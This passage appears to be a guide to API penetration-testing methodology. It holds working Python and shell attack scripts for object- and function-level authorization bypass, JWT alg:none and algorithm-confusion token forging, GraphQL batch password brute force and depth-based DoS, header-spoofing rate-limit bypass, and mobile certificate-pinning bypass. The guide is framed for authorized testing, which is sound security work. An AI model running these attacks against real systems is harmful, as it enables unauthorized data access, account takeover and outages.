# Complete API Penetration Testing Methodologies

## Introduction

API breaches happen because automated scanners cannot detect business logic flaws. When T-Mobile exposed 37 million customer records in January 2023, the vulnerability was straightforward: an API endpoint that did not verify whether users had permission to access specific data. The Optus breach in Australia was even simpler: an API endpoint requiring no authentication at all, exposing 9.8 million records.

> **Note on sourcing:** Some details below (e.g., the exact encoding scheme in the Optus breach) are drawn from widely-repeated security-community reporting rather than an official post-incident disclosure. Treat those as "commonly reported, not independently confirmed" if you're citing them in a client-facing report — verify against primary sources (regulator findings, company disclosures) before stating them as fact.

## Known Limitations / Before You Run This

This document is a testing methodology, not a plug-and-play exploit kit. A few things to sort out before you start, so time isn't lost mid-engagement:

- **Not every snippet here has been validated end-to-end against a live target.** Several code blocks (JWT algorithm confusion, introspection queries, `jwt_tool` flags) are illustrative and will need adaptation — see the caveats inline below each one.
- **CDNs and WAFs change the picture.** Header-spoofing techniques (`X-Forwarded-For`, `X-Real-IP`, etc.) for rate-limit or IP-allowlist bypass only work if the origin server actually trusts and parses those headers. Behind Cloudflare, Akamai, AWS ALB/API Gateway, or similar, these headers are typically stripped or overwritten at the edge, and the technique will fail even against a genuinely vulnerable origin. Confirm what's in front of the target (via `curl -I`, `whatweb`, or passive recon) before spending time on header-based bypasses.
- **Mobile apps usually pin certificates.** None of the Burp/Postman proxy setup here will capture traffic from a mobile app that pins its TLS certificate. You'll need to bypass pinning first (see new section under Tool Setup, below) before any BOLA/BFLA/data-exposure testing against a mobile API is possible.
- **Test scripts mutate real state.** Scripts that create invites, promote users to admin, submit orders, or brute-force logins leave residue in the target system. Plan for cleanup and use a dedicated test tenant/environment where possible (see new section under Testing Checklist).
- **Legal scope covers data handling, not just endpoints.** "Written authorization" typically also specifies what happens to any data you actually manage to pull (PII, credentials, tokens) — usually redact in the report and destroy raw captures per the engagement's rules of engagement. Confirm this explicitly, it's a common gap between pentesters and clients after the fact.

## Pre-Testing Setup

### Map Your API Attack Surface

Before testing, you must understand what you are attacking:

1. **Review Documentation**: Start with OpenAPI specifications, Swagger files, and Postman collections. Documentation provides the foundation, but is rarely complete.

2. **Capture Live Traffic**: Proxy your web and mobile applications through Burp Suite or OWASP ZAP to capture actual API traffic. Shadow APIs (undocumented endpoints) often lack security controls applied to documented endpoints.

3. **Document Authentication Mechanisms**: Identify how the API proves identity: OAuth 2.0, JWT tokens, API keys, or Basic Auth. Note where credentials are transmitted, token lifespans, and revocation processes.

**Critical Distinction**: Authentication proves who you are. Authorization determines what you can access. Most API breaches stem from authorization failures.

### Tool Setup

**Burp Suite Professional**:
1. Open Burp Suite and go to Proxy > Options
2. Set proxy listener to 127.0.0.1:8080
3. Install BApp extensions: Autorize, AuthMatrix, InQL (for GraphQL)
4. Configure your browser to use Burp as proxy

**Postman Configuration**:
1. Go to Settings > Proxy
2. Enable "Global Proxy Configuration"
3. Set proxy host to 127.0.0.1 and port to 8080
4. For HTTPS testing, either:
   - Disable SSL certificate verification (Settings > General > toggle off)
   - Install Burp CA certificate in your system trust store

**Testing Environment**:
- Use a controlled lab environment first (e.g., OWASP crAPI, Juice Shop)
- Establish clear scope: which endpoints are in scope, maximum requests per minute, approved testing windows
- Never test on production without written authorization

### Mobile Certificate Pinning Bypass (Required for Mobile API Testing)

If the target has a mobile app, the proxy setup above will show either no traffic or TLS handshake failures once you install the Burp CA cert, because most production mobile apps pin their certificate. Steps to work around this on a test device you control (rooted Android or jailbroken iOS, or an emulator):

1. **Install Frida** on your workstation and the Frida server on the device:
```bash
pip install frida-tools --break-system-packages
# Push matching frida-server binary to device (must match device arch and Frida version)
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"
```

2. **Use `objection` to bypass pinning at runtime** (no APK patching required):
```bash
pip install objection --break-system-packages
objection -g com.target.app explore
# Inside the objection shell:
android sslpinning disable
```

3. **If objection's generic bypass doesn't work** (custom pinning implementation), patch the APK directly:
```bash
# Decompile
apktool d target-app.apk -o target-decompiled

# Locate and modify the network security config or custom TrustManager
# Typically in res/xml/network_security_config.xml — set:
#   <certificates src="user"/>  (trust user-installed CAs, i.e. Burp's CA)

# Rebuild and sign
apktool b target-decompiled -o target-patched.apk
apksigner sign --ks debug.keystore target-patched.apk
```

4. **Install the Burp CA certificate on the device** so the now-unpinned app trusts your intercepting proxy:
```bash
# Convert Burp CA cert to the format Android expects, then push to system trust store (requires root)
openssl x509 -inform DER -in burp-cert.der -out burp-cert.pem
# Rename using the cert's subject hash, then push to /system/etc/security/cacerts/ (Android <7 or rooted)
# For Android 7+, per-app network_security_config.xml (step 3) is usually required regardless of root
```

5. **iOS equivalent**: use a jailbroken device with Frida installed via Cydia/Sileo, then run `objection`'s `ios sslpinning disable` in the same way, or use SSL Kill Switch 2 as a tweak.

This step is a prerequisite, not optional — none of the BOLA/BFLA/data-exposure testing below is possible against a pinned mobile app until traffic is actually visible in your proxy.

## Methodology 1: Broken Object Level Authorization (BOLA)

### What is BOLA?

BOLA occurs when APIs verify authentication but fail to check authorization for specific resources. An attacker can change an object identifier (like user ID or order number) and access another user's data.

### Real-World Examples

**T-Mobile (January 2023)**: An API endpoint that did not verify whether users had permission to access specific data led to 37 million customer records exposed.

**Optus (2022)**: An API endpoint requiring no authentication at all exposed 9.8 million customer records.

### Step-by-Step Testing Methodology

#### Step 1: Identify Object ID Parameters

From OpenAPI/Swagger documentation:
```bash
# Extract all endpoints with path parameters
curl -s https://target-api.example.com/api/docs/swagger.json | \
  python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ('get','post','put','patch','delete'):
            params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
            if params:
                print(f'{method.upper()} {path} -> params: {params}')
"
```

From Burp Suite Traffic:
1. Browse the application as User A, exercising all features that involve data creation and retrieval
2. In Burp, go to Target > Site Map and filter for API paths (e.g., `/api/v1/`, `/graphql`)
3. Look for patterns: `/api/v1/users/{id}`, `/api/v1/orders/{order_id}`, `/api/v1/documents/{doc_uuid}`

**Classify Object ID Types**:

| ID Type | Example | Predictability | BOLA Risk |
|---------|---------|----------------|-----------|
| Sequential Integer | `/orders/1042` | High - increment/decrement | Critical |
| UUID v4 | `/orders/550e8400-e29b-41d4-a716-446655440000` | Low - random | Medium (if leaked) |
| Encoded/Hashed | `/orders/base64encodedvalue` | Medium - decode and predict | High |
| Composite | `/users/42/orders/1042` | High - multiple IDs to swap | Critical |

#### Step 2: Create Test Accounts

Create three test accounts:
- User A (regular user)
- User B (another regular user)
- User C (administrator, if available)

#### Step 3: Perform BOLA Testing

**Manual Testing with Burp Suite Repeater**:

1. Intercept a request from User A to an object they own (e.g., `GET /api/v1/users/1001/profile`)
2. Send to Repeater (Ctrl+R)
3. Change the object ID to User B's ID (e.g., `GET /api/v1/users/1002/profile`)
4. Send the request and observe the response:
   - If User B's data is returned → BOLA vulnerability confirmed
   - If 401/403 error → Authorization is working
   - If 404 error but other endpoints are vulnerable → Keep testing

**Automated BOLA Testing with Python**:

```python
import requests

BASE_URL = "https://target-api.example.com/api/v1"

# User A credentials
user_a_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_a_headers = {"Authorization": user_a_token, "Content-Type": "application/json"}

# User B credentials
user_b_token = "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
user_b_headers = {"Authorization": user_b_token, "Content-Type": "application/json"}

# Step 1: Identify User A's objects
user_a_profile = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers)
user_a_id = user_a_profile.json()["id"]  # e.g., 1001

# Step 2: Identify User B's objects
user_b_profile = requests.get(f"{BASE_URL}/users/me", headers=user_b_headers)
user_b_id = user_b_profile.json()["id"]  # e.g., 1002

# Test: Access User B's profile with User A's token
resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
if resp.status_code == 200:
    print(f"BOLA FOUND: User A can access User B's profile")
    print(f"Data leaked: {resp.json()}")
```

**Advanced BOLA Techniques**:

```python
# Technique 1: Parameter pollution
resp = requests.get(
    f"{BASE_URL}/orders/{user_a_order_id}?order_id={user_b_order_id}",
    headers=user_a_headers
)

# Technique 2: JSON body object ID override
resp = requests.post(
    f"{BASE_URL}/orders/details",
    headers=user_a_headers,
    json={"order_id": user_b_order_id}
)

# Technique 3: Numeric ID manipulation
for offset in range(-5, 6):
    test_id = user_a_order_id + offset
    resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
    if resp.status_code == 200 and test_id != user_a_order_id:
        print(f"BOLA: Order {test_id} accessible")

# Technique 4: Method switching
for method in ['GET', 'PUT', 'PATCH', 'DELETE']:
    resp = requests.request(method, f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
    if resp.status_code not in (401, 403):
        print(f"Method {method} BOLA: {resp.status_code}")
```

> **Cleanup note:** Techniques 2 and 4 above can create, modify, or delete real records belonging to User B (or User A). Run them against a dedicated test tenant, or capture the pre-test state of any object you touch so it can be restored afterward.

#### Step 4: Automated BOLA Detection with Autorize (Burp Suite)

Autorize automatically replays requests with different user sessions to detect authorization bypasses:

1. Install Autorize from the BApp Store in Burp Suite Professional
2. In the Autorize tab, paste User B's authentication cookie or header
3. Configure the interception filters:
   - Include: `.*\/api\/.*` (only API paths)
   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
4. Browse the application as User A; Autorize automatically replays each request with User B's token
5. Review the Autorize results table:
   - **Green** = Authorization enforced (secure)
   - **Red** = Authorization bypassed (BOLA vulnerability found)
   - **Orange** = Needs manual review

#### Step 5: Reporting BOLA Findings

When documenting a BOLA vulnerability, include:
- The exact endpoint and HTTP method
- The object ID that was manipulated
- The original User A's ID and the target User B's ID
- Screenshot showing User B's data returned with User A's token
- Proof of exploit (curl command or Python script)

Example report entry:
```
VULNERABILITY: BOLA on GET /api/v1/users/{id}/profile
SEVERITY: High

Testing steps:
1. Authenticated as User A (ID: 1001)
2. Sent GET /api/v1/users/1002/profile with User A's token
3. Server returned User B's complete profile including email and phone

Proof:
curl -H "Authorization: Bearer USER_A_TOKEN" \
  https://target.com/api/v1/users/1002/profile

Response: {"id":1002,"email":"victim@example.com","phone":"555-0100"}
```

---

## Methodology 2: Broken Function Level Authorization (BFLA)

### What is BFLA?

BFLA occurs when APIs fail to restrict access to administrative functions. Regular users can access endpoints meant only for admins by guessing or modifying API paths and HTTP methods.

### Real-World Example

**OWASP Example - Invite System**:
A registration process allowed new users to join via:
`GET /api/invites/{invite_guid}`

An attacker changed GET to POST and elevated their role:
`POST /api/invites/new`
`{"email":"attacker@example.com","role":"admin"}`

Only admins should be able to send POST commands, but if not properly secured, the API accepted it and created an admin account.

### Step-by-Step Testing Methodology

#### Step 1: Enumerate All Endpoints

Use Burp Suite or ffuf to discover all endpoints:

```bash
# Directory bruteforce for API endpoints
ffuf -u https://target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,301,302,307,401,403,405

# Common admin paths to check
/api/v1/admin/
/api/v1/internal/
/api/v1/management/
/api/v1/debug/
/v1/admin/
/internal/
```

#### Step 2: Test for Function Access with Regular User Token

Using a regular user account (not admin), attempt to access admin functions:

**Manual Testing with Burp Suite**:

1. Log in as a regular user
2. In Burp Proxy History, find a legitimate API request
3. Send to Repeater (Ctrl+R)
4. Modify the request in these ways:
   - Change the HTTP method (GET to POST, PUT, DELETE)
   - Change the path (users to admins, regular to admin)
   - Add admin parameters to request body
   - Access debug or internal endpoints

**Test Cases for BFLA**:

```python
import requests

BASE_URL = "https://target.com/api/v1"
regular_token = "Bearer REGULAR_USER_TOKEN"

# Test 1: Access admin user list
resp = requests.get(f"{BASE_URL}/admin/users", headers={"Authorization": regular_token})
if resp.status_code == 200:
    print(f"BFLA: Regular user accessed admin user list")

# Test 2: Promote user to admin
resp = requests.put(
    f"{BASE_URL}/admin/users/1001/role",
    headers={"Authorization": regular_token},
    json={"role": "admin"}
)
if resp.status_code == 200:
    print(f"BFLA: Regular user promoted themselves to admin")

# Test 3: Access internal/debug endpoints
for endpoint in ["/internal/status", "/debug/config", "/management/logs"]:
    resp = requests.get(f"{BASE_URL}{endpoint}", headers={"Authorization": regular_token})
    if resp.status_code == 200:
        print(f"BFLA: Regular user accessed {endpoint}")

# Test 4: Method swapping
original_request = f"{BASE_URL}/users/1001/profile"
for method in ['PUT', 'PATCH', 'DELETE']:
    resp = requests.request(method, original_request, headers={"Authorization": regular_token})
    if resp.status_code in (200, 204):
        print(f"BFLA: Regular user used {method} on profile endpoint")
```

> **Caution:** Test 2 (promoting a user to admin) and Test 4 (method swapping to PUT/PATCH/DELETE) mutate real state. If successful, immediately reverse the change (demote the account, restore the profile) and log the before/after state for the report.

#### Step 3: Test for Hidden Admin Parameters

Many APIs accept parameters that change behavior:

```python
# Test for debug/admin parameters
params_to_test = [
    "admin=true",
    "is_admin=1",
    "role=admin",
    "privilege=admin",
    "bypass=true",
    "debug=true",
    "internal=true"
]

for param in params_to_test:
    resp = requests.get(f"{BASE_URL}/users?{param}", headers={"Authorization": regular_token})
    if "admin" in resp.text.lower() or len(resp.json()) > normal_count:
        print(f"Parameter {param} changed response")
```

#### Step 4: Automate BFLA Testing with AuthMatrix (Burp Suite)

AuthMatrix is a Burp extension that automates role-based access control testing:

1. Install AuthMatrix from BApp Store
2. Configure roles (Unauthenticated, Regular User, Admin)
3. Add API endpoints to test
4. Add authentication tokens for each role
5. Run the test - AuthMatrix will try each endpoint with each role
6. Review results: Green cells = allowed, Red cells = should be blocked

### Real-World BFLA Case Study: RBI International (September 2025)

Restaurant Brands International (owner of Burger King, Tim Hortons, Popeyes) had multiple BFLA vulnerabilities:
- Authentication tokens could be generated without proper checks
- Privilege escalation from customer to admin was possible
- An open GraphQL endpoint allowed introspection queries

This maps to OWASP Business Logic Abuse categories BLA6 (Missing Transition Validation), BLA9 (Broken Access Control), and BLA10 (Shadow Function Abuse).

---

## Methodology 3: Excessive Data Exposure

### What is Excessive Data Exposure?

APIs often return complete database objects when only specific fields are needed. This exposes sensitive data like password hashes, internal IDs, API keys, and other users' private information.

### Real-World Example

**T-Mobile (2021)**: The API returned full credit card numbers (PAN) instead of masked values. Attackers could harvest complete payment information.

### Step-by-Step Testing Methodology

#### Step 1: Examine API Responses

When testing any API endpoint, carefully examine the full JSON response:

```python
import requests

resp = requests.get("https://target.com/api/v1/users/me", headers=auth_headers)
print(json.dumps(resp.json(), indent=2))

# Look for sensitive fields:
sensitive_fields = [
    'password', 'password_hash', 'secret', 'api_key', 'token',
    'ssn', 'social_security', 'credit_card', 'pan', 'cvv',
    'internal_id', 'debug', 'stack_trace', 'connection_string',
    'email', 'phone', 'address', 'birthdate'
]

for field in sensitive_fields:
    if field in str(resp.json()).lower():
        print(f"Sensitive field found: {field}")
```

#### Step 2: Compare Different User Responses

Compare what different users can see:

```python
# Get User A's profile
user_a = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers).json()

# Get User B's profile (should be restricted)
user_b = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)

if user_b.status_code == 200:
    # Check if User B's private data is exposed
    user_b_data = user_b.json()
    for field in ['email', 'phone', 'address']:
        if field in user_b_data:
            print(f"Excessive data: User A can see User B's {field}")
```

#### Step 3: Test GraphQL for Excessive Data Exposure

GraphQL is particularly vulnerable to excessive data exposure because clients can request specific fields:

```graphql
# Query that requests excessive data
query {
  user(id: "1001") {
    id
    username
    email
    phoneNumber
    address
    ssn
    passwordHash
    resetToken
    apiKeys {
      key
      createdAt
    }
    creditCards {
      number
      expiry
      cvv
    }
  }
}
```

**GraphQL Field Suggestion Attack**:
If introspection is disabled, use field suggestion techniques to discover fields:

```python
import requests

# Common field names to try
fields = ['id', 'name', 'email', 'password', 'ssn', 'credit_card',
          'token', 'secret', 'address', 'phone', 'birthdate']

for field in fields:
    query = f'{{ user(id: "1") {{ {field} }} }}'
    resp = requests.post("https://target.com/graphql", json={"query": query})
    if resp.status_code == 200 and 'errors' not in resp.json():
        print(f"Field '{field}' is accessible")
```

#### Step 4: Burp Suite Response Analysis

Use Burp Suite's Extractor feature to automatically identify sensitive data:

1. Send an API request to Repeater
2. Go to Extensions > Extractor
3. Configure regex patterns for sensitive data:
   - `"password":\s*"[^"]+"`
   - `"ssn":\s*"[^"]+"`
   - `"credit_card":\s*"[^"]+"`
4. Run Extractor across all API responses
5. Review highlighted matches

---

## Methodology 4: Authentication Bypass

### What is Authentication Bypass?

Weak authentication allows attackers to bypass identity verification entirely. This includes JWT vulnerabilities, missing authentication checks, and header injection.

### Real-World Example

**Microsoft Teams (2021)**: The API used `X-HTTP-Method-Override` header to allow DELETE operations through POST requests. Attackers exploited this to delete any user's messages.

### Step-by-Step Testing Methodology

#### Step 1: Test for Missing Authentication

```python
# Try accessing endpoints without any authentication
endpoints_to_test = [
    "/api/v1/users",
    "/api/v1/admin",
    "/api/v1/internal/config",
    "/v1/users/me",
    "/graphql"
]

for endpoint in endpoints_to_test:
    resp = requests.get(f"{BASE_URL}{endpoint}")
    if resp.status_code == 200:
        print(f"UNAUTHENTICATED ACCESS: {endpoint} accessible")
    elif resp.status_code == 401:
        print(f"Authentication required (secure): {endpoint}")
```

#### Step 2: Test Header Injection Bypasses

```python
# Headers that may bypass authentication
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"}
]

for headers in bypass_headers:
    resp = requests.get(f"{BASE_URL}/admin", headers=headers)
    if resp.status_code != 401:
        print(f"Bypass with {headers}: HTTP {resp.status_code}")
```

> **Caveat:** These header-based bypasses only work if the origin application server (not just a CDN/WAF in front of it) is coded to trust and act on these headers — e.g., an internal-IP allowlist check that reads `X-Forwarded-For` naively. If the target sits behind Cloudflare, Akamai, or a cloud load balancer, that infrastructure usually overwrites these headers before the origin ever sees them, and this test will reliably fail even against a genuinely misconfigured origin further back. Confirm what's actually terminating TLS and forwarding the request before concluding this class of bypass doesn't apply.

#### Step 3: Test HTTP Method Override

```python
# Try method override headers
override_headers = [
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-HTTP-Method"
]

for header in override_headers:
    resp = requests.post(
        f"{BASE_URL}/users/1001",
        headers={header: "DELETE", "Authorization": user_token}
    )
    if resp.status_code in (200, 204):
        print(f"Method override with {header}: User deleted")
```

#### Step 4: Comprehensive JWT Testing

**JWT Attack Methodology**:

1. **Extract JWT** from Authorization header or cookies
2. **Decode JWT** using jwt_tool:
```bash
python3 jwt_tool.py <JWT>
```

3. **Test None Algorithm**:
```bash
python3 jwt_tool.py <JWT> -X a
```
If successful, you can forge tokens with arbitrary claims.

> **Version note:** `jwt_tool`'s CLI flags have changed across releases (older versions used `-X a` for the "alg:none" attack; newer versions expose this via an interactive menu or `-T` for tampering mode). Run `python3 jwt_tool.py -h` against your installed version first and match flags to what's actually listed — don't copy flags blind from documentation written for a different version.

4. **Test Algorithm Confusion (RS256 to HS256)**:
```bash
# Get public key from /jwks.json or /certs
curl https://target.com/.well-known/jwks.json > jwks.json
```

This attack works because some JWT libraries use the same verification function for both algorithms — if the server is told to verify with HS256, it treats whatever key it's given as an HMAC secret. Since the RS256 public key is, well, public, an attacker can sign a token with HS256 using the public key itself as the "secret," and a vulnerable server will accept it as validly signed.

The step most guides gloss over is converting the JWKS JSON into an actual PEM-formatted public key, since the JWKS format stores the modulus (`n`) and exponent (`e`) as separate base64url-encoded values, not a ready-to-use key:

```python
import base64
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

def b64url_to_int(val: str) -> int:
    padded = val + "=" * (-len(val) % 4)
    return int.from_bytes(base64.urlsafe_b64decode(padded), "big")

with open("jwks.json") as f:
    jwks = json.load(f)

# Pick the key matching the JWT's "kid" header claim
key_data = jwks["keys"][0]
n = b64url_to_int(key_data["n"])
e = b64url_to_int(key_data["e"])

public_numbers = RSAPublicNumbers(e, n)
public_key = public_numbers.public_key()

pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("public.pem", "wb") as f:
    f.write(pem)
```

Once you have a real PEM file, forge the token:
```python
import jwt

key = open('public.pem').read()
forged_token = jwt.encode({"admin": True, "sub": "1001"}, key, algorithm='HS256')
# Test the forged token against a protected endpoint
```

5. **Brute Force Weak Secret**:
```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

6. **Modify Claims**:
```python
import jwt

# Decode without verification
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"Original claims: {decoded}")

# Modify claims
decoded['user_id'] = 1
decoded['role'] = 'admin'
decoded['exp'] = 9999999999  # Far future

# Re-encode with weak secret if known
new_token = jwt.encode(decoded, 'secret', algorithm='HS256')
```

---

## Methodology 5: GraphQL API Testing

### GraphQL Specific Vulnerabilities

GraphQL APIs have unique attack surfaces including introspection, batch queries, and circular queries.

### Real-World Example

**Shopify (2019)**: GraphQL API rate-limited single queries but not batched queries. Attackers sent 100 mutations in one batch to brute force passwords.

### Step-by-Step Testing Methodology

#### Step 1: Discover GraphQL Endpoint

```bash
# Common GraphQL endpoints
/graphql
/graphiql
/v1/graphql
/api/graphql
/graphql/console
/graphql.php
```

#### Step 2: Test for Introspection

If introspection is enabled, you can download the entire schema. The minimal query below is enough to confirm introspection is enabled, but it omits arguments, input types, interfaces, and unions — for a complete schema dump (what InQL or GraphiQL actually use), use the full canonical introspection query instead:

```graphql
# Minimal check — confirms introspection is on, but incomplete
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

```graphql
# Full introspection query (captures args, inputs, interfaces, unions, directives)
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

**Using InQL Burp Extension**:
1. Install InQL from BApp Store
2. Send a GraphQL request to InQL
3. Click "Run Introspection"
4. Review the discovered schema including:
   - All queries and mutations
   - Input types and arguments
   - Deprecated fields

#### Step 3: Test Batch Query Attacks

GraphQL allows sending multiple queries in one request, which can bypass rate limiting:

```graphql
# Batch query for password brute force
mutation {
  a1: login(email: "admin@example.com", password: "password1") { token }
  a2: login(email: "admin@example.com", password: "password2") { token }
  a3: login(email: "admin@example.com", password: "password3") { token }
  # ... up to 100 attempts in one request
}
```

**Python automation for batch attacks**:

```python
import requests
import string
import random

def create_batch_query(emails, passwords):
    mutations = []
    for i, (email, password) in enumerate(zip(emails, passwords)):
        mutations.append(f'a{i}: login(email: "{email}", password: "{password}") {{ token }}')
    return f'mutation {{ {" ".join(mutations)} }}'

# Batch 100 password attempts
passwords = ['password123', 'admin123', 'letmein']  # plus wordlist
query = create_batch_query(['admin@example.com'] * len(passwords), passwords)
resp = requests.post("https://target.com/graphql", json={"query": query})
```

> **Destructive-test throttling:** Even inside a single batched request, a password brute force against a live account can trigger account lockout, alert the security team, or (if it succeeds) grant access to an account you don't have standing authorization to fully operate. Cap the wordlist size, use test accounts you created for the engagement rather than real admin accounts, and clear this specific test with the client contact before running it beyond a handful of attempts.

#### Step 4: Test Circular Query (DoS)

Deeply nested queries can cause resource exhaustion:

```graphql
# Circular query - references itself
query Circular {
  user(id: "123") {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Test for recursion depth limits**:

```python
def create_nested_query(depth):
    if depth == 0:
        return "name"
    return f"friends {{ {create_nested_query(depth-1)} }}"

for depth in [5, 10, 20, 50]:
    query = f'{{ user(id: "1") {{ {create_nested_query(depth)} }} }}'
    resp = requests.post("https://target.com/graphql", json={"query": query})
    print(f"Depth {depth}: HTTP {resp.status_code}, Response time: {resp.elapsed.total_seconds()}s")
```

> **Caution:** This is a resource-exhaustion (DoS) test by design. Escalating depth against a production system can cause a genuine outage. Run it against staging where possible, and if it must run against production, agree on a hard stop condition (response time threshold, error rate) with the client beforehand and have a kill switch ready.

#### Step 5: GraphQL BOLA Testing

GraphQL's node/ID relay pattern is often vulnerable to BOLA:

```graphql
# Test if you can access other users' objects by global ID
query {
  node(id: "VXNlcjoxMDAy") {  # Base64 encoded "User:1002" (User B)
    ... on User {
      id
      email
      phoneNumber
      orders {
        edges {
          node {
            id
            totalAmount
          }
        }
      }
    }
  }
}
```

**Base64 ID manipulation**:
```python
import base64

def encode_graphql_id(type_name, id_value):
    """Encode GraphQL global ID (format: TypeName:id)"""
    return base64.b64encode(f"{type_name}:{id_value}".encode()).decode()

# Test sequential IDs
for i in range(1000, 1010):
    gid = encode_graphql_id("User", i)
    query = f'{{ node(id: "{gid}") {{ ... on User {{ id email }} }} }}'
    resp = requests.post("https://target.com/graphql", json={"query": query})
    if resp.status_code == 200 and resp.json().get('data', {}).get('node'):
        print(f"User {i} accessible: {resp.json()['data']['node']}")
```

---

## Methodology 6: Rate Limiting Bypass

### What is Rate Limiting Bypass?

APIs without proper rate limiting enable denial-of-service attacks, brute force, and excessive data harvesting.

### Real-World Example

**Shopify (2020)**: Reset password endpoint limited attempts per IP. Attackers rotated the `X-Forwarded-For` header with different IPs for each request, bypassing the limit.

### Step-by-Step Testing Methodology

#### Step 1: Test Basic Rate Limiting

```python
import time
import requests

def test_rate_limit(endpoint, auth_headers=None, num_requests=100):
    responses = []
    for i in range(num_requests):
        resp = requests.get(endpoint, headers=auth_headers)
        responses.append(resp.status_code)
        if i % 10 == 0:
            print(f"Request {i}: HTTP {resp.status_code}")

    # Check if any requests were blocked
    if 429 in responses:
        print(f"Rate limiting active: {responses.count(429)} of {num_requests} blocked")
    else:
        print("NO RATE LIMITING: All 100 requests succeeded")
```

#### Step 2: Test IP Rotation Bypasses

```python
# Headers that may bypass IP-based rate limiting
ip_headers = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr"
]

def test_ip_rotation(endpoint, data=None):
    for i in range(50):
        headers = {}
        for h in ip_headers:
            headers[h] = f"10.0.0.{i % 255}"
        if data:
            resp = requests.post(endpoint, headers=headers, json=data)
        else:
            resp = requests.get(endpoint, headers=headers)
        if resp.status_code == 429:
            print(f"IP rotation failed at request {i}")
            return False
    print("IP ROTATION BYPASS SUCCESSFUL: No rate limiting triggered")
    return True
```

> **Same CDN/WAF caveat as Methodology 4 applies here**: this only demonstrates a real bypass if the origin server itself trusts these headers for rate-limiting decisions. If a CDN or API gateway sits in front and does its own rate limiting based on the actual connecting IP, spoofed headers won't affect it — you'd be testing the origin's logic in isolation, which may not reflect what an internet-facing attacker can actually achieve.

#### Step 3: Test Parameter Pollution Bypass

Adding parameters can change the cache key:

```python
def test_parameter_pollution(endpoint):
    base_resp = requests.get(endpoint)

    # Test various parameter additions
    bypass_params = [
        f"?_={int(time.time())}",
        "?cache_buster=1",
        "?random=123",
        "?debug=true",
        "%00",
        "%0d%0a"
    ]

    for param in bypass_params:
        success = True
        for i in range(50):
            resp = requests.get(f"{endpoint}{param}")
            if resp.status_code == 429:
                success = False
                break
        if success:
            print(f"Parameter bypass: {param} works")
```

#### Step 4: Test Case Variation Bypass

Some rate limiters use case-sensitive path matching:

```python
def test_case_variation(endpoint):
    variations = [
        endpoint.upper(),
        endpoint.lower(),
        endpoint.title(),
        endpoint.swapcase()
    ]

    for var in variations:
        success = True
        for i in range(50):
            resp = requests.get(var)
            if resp.status_code == 429:
                success = False
                break
        if success:
            print(f"Case variation bypass: {var}")
```

---

## Methodology 7: WebSocket and Webhook API Testing

Real-time and event-driven APIs (WebSocket connections, webhook delivery/receipt endpoints) are increasingly common and often skipped in REST/GraphQL-focused testing, but carry their own authorization and validation issues.

### WebSocket Testing

1. **Capture the handshake.** WebSocket connections start as an HTTP `Upgrade` request — proxy this through Burp like any other request to see the initial auth token/cookie exchange.
2. **Check for missing per-message authorization.** Many WebSocket implementations authenticate once at connection time but never re-check authorization on individual messages sent over the socket afterward. Test by connecting as User A, then sending a message requesting User B's data over the same socket:

```python
import websocket
import json

ws = websocket.create_connection(
    "wss://target.com/ws",
    header=[f"Authorization: Bearer {user_a_token}"]
)

# After connecting as User A, try requesting User B's resource over the socket
ws.send(json.dumps({"action": "get_order", "order_id": user_b_order_id}))
result = ws.recv()
print(result)  # If User B's order data comes back, authorization isn't re-checked per-message
```

3. **Test origin validation.** Many WebSocket servers don't validate the `Origin` header, which can enable cross-site WebSocket hijacking. Try connecting with a mismatched `Origin` header and see if the handshake still succeeds.

### Webhook Testing

1. **Check signature validation on incoming webhooks.** If the target API receives webhooks (e.g., from a payment provider), test whether it validates the signature header (commonly `X-Signature` or similar HMAC-based header) or accepts any payload:

```python
import requests

# Send a webhook payload without a valid signature
fake_payload = {"event": "payment.completed", "order_id": "1001", "amount": 0.01}
